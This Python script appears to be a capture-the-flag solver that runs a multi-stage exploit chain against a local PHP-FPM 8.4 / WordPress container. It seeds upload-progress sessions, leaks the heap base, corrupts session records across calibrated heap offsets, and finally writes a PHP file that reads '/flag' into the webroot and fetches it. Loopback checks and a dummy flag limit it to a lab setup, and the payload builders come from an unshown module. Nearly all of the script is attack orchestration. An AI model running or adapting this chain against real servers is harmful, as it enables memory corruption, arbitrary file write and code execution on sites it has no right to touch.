#!/usr/bin/env python3
"""Loopback-only chain for the pinned PHP 8.4.26 / WordPress 6.9.10 profile."""

import argparse
import hashlib
import http.client
import json
import os
import re
import secrets
import shlex
import string
import subprocess
import time
from pathlib import Path, PurePosixPath

from payloads import (
    GEOMETRIES,
    FORGED_BOUNDARY,
    build_leak,
    build_producer,
    build_r2a,
    build_r2b,
    build_r3,
    make_pressure_body,
    parse_heap_base,
    payload_plan,
    sha256,
)

HERE = Path(__file__).resolve().parent

HOST = "127.0.0.1"
PORT = 18235
CONTAINER = "php2shell-fpm84"
DOCKER = ["docker"]
SID = ""
RUN_DIR = None
EVENTS = []

SCALAR = b"upload_progress_stockdwatch|i:0;"
PAIR = SCALAR + b"upload_progress_K2stage0001|a:0:{}"
PHP_FILENAME = b"<?=readfile('/flag')?>"
DUMMY_FLAG = b"hitcon{local_fpm84_dummy_do_not_submit}"
INITIAL_UPLOADS = 1017
NEUTRAL_UPLOADS = 901


def info(text):
    print(f"[*] {text}", flush=True)


def good(text):
    print(f"[+] {text}", flush=True)




def fresh_sid():
    chars = string.ascii_lowercase + string.digits
    return "".join(secrets.choice(chars) for _ in range(15))


def docker(*args, timeout=90):
    return subprocess.run(
        [*DOCKER, *args],
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
        timeout=timeout,
        check=False,
    )


def read_file(path):
    result = docker("exec", CONTAINER, "cat", path)
    if result.returncode == 0:
        return result.stdout
    if b"No such file or directory" in result.stderr:
        return None
    raise RuntimeError(result.stderr.decode(errors="replace")[:300])


def worker_pid():
    result = docker("top", CONTAINER, "-eo", "pid,ppid,user,cmd")
    if result.returncode:
        raise RuntimeError(result.stderr.decode(errors="replace")[:300])

    pids = []
    for line in result.stdout.decode().splitlines():
        if "php-fpm: pool www" in line:
            pids.append(int(line.split()[0]))

    if len(pids) != 1:
        raise RuntimeError(f"expected one FPM worker, found {pids}")
    return pids[0]


def wait_worker():
    last_error = None
    for _ in range(30):
        try:
            return worker_pid()
        except RuntimeError as error:
            last_error = error
            time.sleep(0.2)
    raise RuntimeError(f"FPM worker did not appear: {last_error}")

def fingerprint():
    php = docker("exec", CONTAINER, "php", "-r", "echo PHP_VERSION;")
    wordpress = docker(
        "exec",
        CONTAINER,
        "php",
        "-r",
        "include '/var/www/html/wp-includes/version.php'; echo $wp_version;",
    )
    ini = docker(
        "exec",
        CONTAINER,
        "php",
        "-r",
        "echo ini_get('memory_limit'),'|',ini_get('session.upload_progress.enabled'),'|',ini_get('session.save_path');",
    )
    image = docker("inspect", CONTAINER, "--format", "{{.Image}}")
    results = [php, wordpress, ini, image]
    if any(result.returncode for result in results):
        errors = [result.stderr.decode(errors="replace")[:200] for result in results]
        raise RuntimeError(f"local fingerprint commands failed: {errors}")
    facts = {
        "php": php.stdout.decode(),
        "wordpress": wordpress.stdout.decode(),
        "ini": ini.stdout.decode(),
        "container_image_id": image.stdout.decode().strip(),
        "geometry_candidates": [
            {
                "big_value_from_b": hex(big_offset),
                "p_from_b": hex(p_offset),
                "q_from_b": hex(q_offset),
            }
            for big_offset, p_offset, q_offset in GEOMETRIES
        ],
        "calibration": "paired lineages for the pinned local image; no remote-host mode",
    }
    if facts["php"] != "8.4.26" or facts["wordpress"] != "6.9.10" or facts["ini"] != "128M|1|/tmp":
        raise RuntimeError(f"unsupported FPM84 fingerprint: {facts}")
    return facts


def wait_replacement(old_pid):
    current = old_pid
    for _ in range(30):
        try:
            current = worker_pid()
        except RuntimeError:
            time.sleep(0.2)
            continue
        if current != old_pid:
            return current
        time.sleep(0.2)
    return current


def request(method, path, body=None, boundary=None, sid=None):
    headers = {"Host": f"{HOST}:{PORT}"}
    if body is not None:
        if boundary is None:
            raise RuntimeError("multipart request is missing its boundary")
        headers["Content-Type"] = "multipart/form-data; boundary=" + boundary
        headers["Content-Length"] = str(len(body))
    if sid is not None:
        headers["Cookie"] = "PHPSESSID=" + sid

    conn = http.client.HTTPConnection(HOST, PORT, timeout=90)
    try:
        conn.request(method, path, body=body, headers=headers)
        response = conn.getresponse()
        return response.status, response.read()
    finally:
        conn.close()


def flush_log():
    data = {"sid": SID, "events": EVENTS}
    (RUN_DIR / "manifest.json").write_text(json.dumps(data, indent=2) + "\n")


def note(stage, **values):
    EVENTS.append({"stage": stage, **values})
    flush_log()


def save(name, data):
    (RUN_DIR / name).write_bytes(data)


def seed_body(sid, uploads):
    return make_pressure_body(
        uploads,
        60,
        0,
        4000,
        progress=True,
        session_id=sid,
        progress_key="stockdwatch",
    )


def array_record(data):
    return data is not None and data.startswith(b"upload_progress_stockdwatch|a:5:")


def warm(label, expected_pid):
    status, body = request("GET", "/")
    save(f"{label}-warm.response.bin", body)
    pid = worker_pid()
    note(
        f"{label}_warm",
        status=status,
        bytes=len(body),
        sha256=sha256(body),
        expected_pid=expected_pid,
        actual_pid=pid,
    )
    if status != 200 or len(body) != 65614 or pid != expected_pid:
        raise RuntimeError(f"{label}: warm request changed")


def arm_producer(label, expected_pid):
    body, boundary = build_producer()
    save(f"{label}-producer.request.bin", body)
    status, response = request("POST", "/", body, boundary)
    save(f"{label}-producer.response.bin", response)
    pid = worker_pid()
    note(
        f"{label}_producer",
        status=status,
        request_bytes=len(body),
        request_sha256=sha256(body),
        response_bytes=len(response),
        response_sha256=sha256(response),
        expected_pid=expected_pid,
        actual_pid=pid,
    )
    if status != 200 or b"Allowed memory size" not in response or pid != expected_pid:
        raise RuntimeError(f"{label}: producer did not leave the expected worker alive")


def replace_worker(label, expected_record):
    before = worker_pid()
    throw_sid = fresh_sid()
    if read_file("/tmp/sess_" + throw_sid) is not None:
        raise RuntimeError("throwaway SID already exists")

    body, boundary = seed_body(throw_sid, NEUTRAL_UPLOADS)
    save(f"{label}-neutral.request.bin", body)
    status, response = request("POST", "/wp-login.php", body, boundary, throw_sid)
    save(f"{label}-neutral.response.bin", response)

    after = wait_replacement(before)
    throw_record = read_file("/tmp/sess_" + throw_sid)
    target_record = read_file("/tmp/sess_" + SID)
    note(
        f"{label}_neutral",
        status=status,
        request_bytes=len(body),
        request_sha256=sha256(body),
        response_bytes=len(response),
        response_sha256=sha256(response),
        throw_sid=throw_sid,
        throw_bytes=None if throw_record is None else len(throw_record),
        before_pid=before,
        after_pid=after,
        target_sha256=None if target_record is None else sha256(target_record),
    )

    if status != 200:
        raise RuntimeError(f"{label}: neutral request failed")
    if after == before:
        raise RuntimeError(f"{label}: worker was not replaced")
    if throw_record is None or len(throw_record) not in (327, 331):
        raise RuntimeError(f"{label}: bad throwaway progress record")
    if not array_record(throw_record):
        raise RuntimeError(f"{label}: throwaway record is not the expected array")
    if target_record != expected_record:
        raise RuntimeError(f"{label}: target session changed before the stage")

    warm(label, after)
    arm_producer(label, after)
    if read_file("/tmp/sess_" + SID) != expected_record:
        raise RuntimeError(f"{label}: producer changed the target session")
    return after


def seed_and_leak(restart):
    if restart:
        info("restarting the local FPM container")
        result = docker("restart", CONTAINER, timeout=120)
        if result.returncode:
            raise RuntimeError(result.stderr.decode(errors="replace")[:300])
        time.sleep(3)

    first_pid = wait_worker()
    session_path = "/tmp/sess_" + SID
    if read_file(session_path) is not None:
        raise RuntimeError("the target SID already exists")

    info(f"seeding upload progress with SID {SID}")
    body, boundary = seed_body(SID, INITIAL_UPLOADS)
    save("seed.request.bin", body)
    status, response = request("POST", "/wp-login.php", body, boundary, SID)
    save("seed.response.bin", response)

    seeded_pid = wait_replacement(first_pid)
    record = read_file(session_path)
    if record is not None:
        save("seed.session.bin", record)
    note(
        "seed",
        status=status,
        request_bytes=len(body),
        request_sha256=sha256(body),
        response_bytes=len(response),
        response_sha256=sha256(response),
        before_pid=first_pid,
        after_pid=seeded_pid,
        session_bytes=None if record is None else len(record),
        session_sha256=None if record is None else sha256(record),
    )

    if status != 200 or seeded_pid == first_pid:
        raise RuntimeError("initial seed did not replace the worker")
    if record is None or len(record) not in (327, 331) or not array_record(record):
        raise RuntimeError("initial seed did not save the expected progress array")

    warm("initial", seeded_pid)
    arm_producer("initial", seeded_pid)

    info("sending the reflected depth55 leak")
    leak = build_leak()
    leak_sid = fresh_sid()
    save("initial-leak.request.bin", leak)
    leak_status, leak_response = request(
        "POST",
        "/index.php",
        leak,
        FORGED_BOUNDARY.decode(),
        leak_sid,
    )
    save("initial-leak.response.bin", leak_response)

    base = parse_heap_base(leak_response) if leak_status == 200 else 0
    after_leak_pid = worker_pid()
    note(
        "initial_leak",
        status=leak_status,
        request_bytes=len(leak),
        request_sha256=sha256(leak),
        response_bytes=len(leak_response),
        response_sha256=sha256(leak_response),
        leak_sid=leak_sid,
        B=f"0x{base:016x}",
        pid=after_leak_pid,
    )

    if leak_status != 200 or base == 0 or after_leak_pid != seeded_pid:
        raise RuntimeError("heap leak failed")

    good(f"heap base: {hex(base)}")
    arm_producer("initial-rearm", seeded_pid)
    if read_file(session_path) != record:
        raise RuntimeError("target session changed during the leak")
    return base, record


def ordered_geometries(preferred=None):
    geometries = list(GEOMETRIES)
    if preferred in geometries:
        geometries.remove(preferred)
        geometries.insert(0, preferred)
    return geometries


def stage_r2a(base, record):
    for attempt, geometry in enumerate(ordered_geometries(), 1):
        big_offset, p_offset, q_offset = geometry
        label = f"r2a-{attempt:02d}"
        info(
            f"R2a attempt {attempt}: BIG-B={hex(big_offset)} "
            f"P-B={hex(p_offset)}"
        )
        armed_pid = replace_worker(label, record)
        body = build_r2a(
            base,
            big_value_from_b=big_offset,
            p_from_b=p_offset,
        )
        save(f"{label}.request.bin", body)
        status, response = request(
            "POST", "/index.php", body, FORGED_BOUNDARY.decode(), SID
        )
        save(f"{label}.response.bin", response)

        after_pid = wait_replacement(armed_pid)
        after = read_file("/tmp/sess_" + SID)
        if after is not None:
            save(f"{label}.session.bin", after)
        note(
            "r2a_attempt",
            attempt=attempt,
            big_value_offset=hex(big_offset),
            p_offset=hex(p_offset),
            q_offset=hex(q_offset),
            status=status,
            request_bytes=len(body),
            request_sha256=sha256(body),
            response_bytes=len(response),
            response_sha256=sha256(response),
            before_pid=armed_pid,
            after_pid=after_pid,
            session_bytes=None if after is None else len(after),
            session_sha256=None if after is None else sha256(after),
            scalar=after == SCALAR,
        )

        if after == SCALAR:
            if after_pid == armed_pid:
                raise RuntimeError("R2a worked without the expected worker replacement")
            good("R2a saved the scalar session")
            return geometry, after
        if after_pid == armed_pid or not array_record(after):
            raise RuntimeError("R2a miss left a bad retry state")
        record = after

    raise RuntimeError("R2a did not hit any measured geometry")


def stage_r2b(base, preferred):
    for attempt, geometry in enumerate(ordered_geometries(preferred), 1):
        big_offset, p_offset, q_offset = geometry
        label = f"r2b-{attempt:02d}"
        info(
            f"R2b attempt {attempt}: BIG-B={hex(big_offset)} "
            f"P-B={hex(p_offset)}"
        )
        armed_pid = replace_worker(label, SCALAR)
        body = build_r2b(
            base,
            big_value_from_b=big_offset,
            p_from_b=p_offset,
        )
        save(f"{label}.request.bin", body)
        status, response = request(
            "POST", "/index.php", body, FORGED_BOUNDARY.decode(), SID
        )
        save(f"{label}.response.bin", response)

        after_pid = wait_replacement(armed_pid)
        after = read_file("/tmp/sess_" + SID)
        if after is not None:
            save(f"{label}.session.bin", after)
        note(
            "r2b_attempt",
            attempt=attempt,
            big_value_offset=hex(big_offset),
            p_offset=hex(p_offset),
            q_offset=hex(q_offset),
            status=status,
            request_bytes=len(body),
            request_sha256=sha256(body),
            response_bytes=len(response),
            response_sha256=sha256(response),
            before_pid=armed_pid,
            after_pid=after_pid,
            session_bytes=None if after is None else len(after),
            session_sha256=None if after is None else sha256(after),
            pair=after == PAIR,
        )

        if after == PAIR:
            if after_pid == armed_pid:
                raise RuntimeError("R2b worked without the expected worker replacement")
            good("R2b saved the scalar + array session")
            return geometry, after
        if after_pid == armed_pid or after != SCALAR:
            raise RuntimeError("R2b miss left a bad retry state")

    raise RuntimeError("R2b did not hit any measured geometry")


def target_for_attempt(base_target, attempt):
    if attempt == 1:
        return base_target
    path = PurePosixPath(base_target)
    return str(path.with_name(f"{path.stem}-q{attempt:02d}{path.suffix}"))


def stage_r3(base, preferred, base_target, marker):
    if not base_target.startswith("/var/www/html/r3-") or not base_target.endswith(".php"):
        raise RuntimeError("target must look like /var/www/html/r3-*.php")

    for attempt, geometry in enumerate(ordered_geometries(preferred), 1):
        big_offset, p_offset, q_offset = geometry
        label = f"r3-{attempt:02d}"
        target = target_for_attempt(base_target, attempt)
        info(
            f"R3 attempt {attempt}: BIG-B={hex(big_offset)} "
            f"Q-B={hex(q_offset)}"
        )

        if read_file(target) is not None:
            raise RuntimeError(f"target already exists: {target}")

        armed_pid = replace_worker(label, PAIR)
        body = build_r3(
            base,
            q_offset,
            big_value_from_b=big_offset,
            path=target.encode() + b"\0",
            filename=PHP_FILENAME,
        )
        save(f"{label}.request.bin", body)
        status, response = request(
            "POST", "/index.php", body, FORGED_BOUNDARY.decode(), SID
        )
        save(f"{label}.response.bin", response)

        after_pid = wait_replacement(armed_pid)
        after = read_file("/tmp/sess_" + SID)
        written = read_file(target)
        if written is not None:
            save(f"{label}.target.bin", written)

        get_status = 0
        get_response = b""
        if written is not None:
            get_status, get_response = request("GET", "/" + PurePosixPath(target).name)
            save(f"{label}.get.bin", get_response)

        success = (
            after == PAIR
            and written is not None
            and PHP_FILENAME in written
            and get_status == 200
            and marker in get_response
        )
        note(
            "r3_attempt",
            attempt=attempt,
            big_value_offset=hex(big_offset),
            p_offset=hex(p_offset),
            q_offset=hex(q_offset),
            target=target,
            status=status,
            request_bytes=len(body),
            request_sha256=sha256(body),
            response_bytes=len(response),
            response_sha256=sha256(response),
            before_pid=armed_pid,
            after_pid=after_pid,
            pair_preserved=after == PAIR,
            target_bytes=None if written is None else len(written),
            target_sha256=None if written is None else sha256(written),
            marker_in_target=written is not None and PHP_FILENAME in written,
            get_status=get_status,
            get_bytes=len(get_response),
            get_sha256=sha256(get_response),
            expected_marker_found=marker in get_response,
            success=success,
        )

        if success:
            good(f"R3 wrote {target}")
            return geometry, target, get_response
        if after != PAIR or written is not None:
            raise RuntimeError("R3 miss left a bad retry state")

    raise RuntimeError("R3 did not hit any measured geometry")


def show_plan(args):
    plan = payload_plan()
    print("[*] offline check, no request was sent")
    print(f"[*] target     http://{args.host}:{args.port}")
    print(f"[*] SID        {args.sid or '<random at execution>'}")
    for index, (big_offset, p_offset, q_offset) in enumerate(GEOMETRIES, 1):
        print(
            f"[*] geometry {index} BIG-B={hex(big_offset)} "
            f"P-B={hex(p_offset)} Q-B={hex(q_offset)}"
        )
    print(
        f"[+] producer   {plan['producer']['bytes']} bytes  "
        f"{plan['producer']['sha256']}"
    )
    print(
        f"[+] leak       {plan['leak']['bytes']} bytes  "
        f"{plan['leak']['sha256']}"
    )
    print(f"[*] R2a body   {plan['r2a_bytes']} bytes")
    print(f"[*] R2b body   {plan['r2b_bytes']} bytes")
    print(f"[*] R3 body    {plan['r3_bytes']} bytes")
    print("[*] add --execute --accept-fixed-geometry to run the local chain")


def main():
    global HOST, PORT, CONTAINER, DOCKER, SID, RUN_DIR, EVENTS

    parser = argparse.ArgumentParser()
    parser.add_argument("--execute", action="store_true")
    parser.add_argument("--restart-at-start", action="store_true")
    parser.add_argument("--accept-fixed-geometry", action="store_true")
    parser.add_argument("--host", default="127.0.0.1")
    parser.add_argument("--port", type=int, default=18235)
    parser.add_argument("--container", default="php2shell-fpm84")
    parser.add_argument(
        "--docker-command",
        default=os.environ.get("PHP2SHELL_DOCKER_CMD", "docker"),
    )
    parser.add_argument("--sid")
    parser.add_argument("--output-dir", type=Path)
    parser.add_argument("--target")
    parser.add_argument("--expected-marker", default=DUMMY_FLAG.decode())
    args = parser.parse_args()

    if args.host not in {"127.0.0.1", "localhost", "::1"}:
        parser.error("this solver only runs against loopback")
    if args.port != 18235:
        parser.error("the packaged FPM84 heap geometry is calibrated for loopback port 18235")
    if not re.fullmatch(r"[A-Za-z0-9_.-]+", args.container):
        parser.error("bad container name")

    docker_command = shlex.split(args.docker_command)
    if not docker_command:
        parser.error("empty Docker command")

    if not args.execute:
        show_plan(args)
        return
    if not args.accept_fixed_geometry:
        parser.error("--accept-fixed-geometry is required for the pinned FPM84 offsets")

    sid = args.sid or fresh_sid()
    if not re.fullmatch(r"[A-Za-z0-9]{15}", sid):
        parser.error("SID must be exactly 15 letters or digits")

    HOST = args.host
    PORT = args.port
    CONTAINER = args.container
    DOCKER = docker_command
    SID = sid
    RUN_DIR = args.output_dir or HERE / "runs" / SID
    EVENTS = []
    target = args.target or f"/var/www/html/r3-{SID}.php"
    marker = args.expected_marker.encode()

    RUN_DIR.mkdir(parents=True, exist_ok=False)
    flush_log()
    info(f"artifacts: {RUN_DIR}")
    facts = fingerprint()
    note("preflight", **facts, pid=worker_pid())

    try:
        base, original_record = seed_and_leak(args.restart_at_start)
        r2a_geometry, scalar = stage_r2a(base, original_record)
        r2b_geometry, pair = stage_r2b(base, r2a_geometry)
        r3_geometry, final_target, response = stage_r3(
            base,
            r2b_geometry,
            target,
            marker,
        )
        r2a_big, r2a_p, _ = r2a_geometry
        r2b_big, r2b_p, _ = r2b_geometry
        r3_big, _, r3_q = r3_geometry

        result = {
            "success": True,
            "profile": "fpm84",
            "fingerprint": facts,
            "B": f"0x{base:016x}",
            "sid": SID,
            "r2a_big_value_offset": hex(r2a_big),
            "r2a_p_offset": hex(r2a_p),
            "r2b_big_value_offset": hex(r2b_big),
            "r2b_p_offset": hex(r2b_p),
            "r3_big_value_offset": hex(r3_big),
            "r3_q_offset": hex(r3_q),
            "scalar_sha256": hashlib.sha256(scalar).hexdigest(),
            "pair_sha256": hashlib.sha256(pair).hexdigest(),
            "target": final_target,
            "response_bytes": len(response),
            "response_sha256": hashlib.sha256(response).hexdigest(),
            "expected_marker": args.expected_marker,
        }
        (RUN_DIR / "result.json").write_text(json.dumps(result, indent=2) + "\n")
        note("complete", **result)
        print(json.dumps(result, indent=2))
    except Exception as error:
        note("abort", error=f"{type(error).__name__}: {error}")
        raise


if __name__ == "__main__":
    main()
